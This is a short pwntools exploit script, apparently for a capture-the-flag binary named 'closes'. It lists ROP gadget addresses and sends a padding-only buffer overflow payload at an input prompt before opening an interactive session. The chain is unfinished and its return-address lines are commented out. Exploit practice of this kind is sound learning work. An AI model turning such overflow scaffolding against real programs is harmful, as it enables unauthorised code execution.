from pwn import*
p = process('./closes')
# gadget
pop_rdi = 0x401516
pop_rdx_rsi = 0x4429a9
# exploit
pay = ''
pay += 'a'*0x10
pay += 'b'*0x8
pay += 'c'*0x8
#pay += 'X'*(0x200-len(pay))
#pay += p64(0x400ac9)
raw_input()
p.sendafter('input : ',pay)


p.interactive()
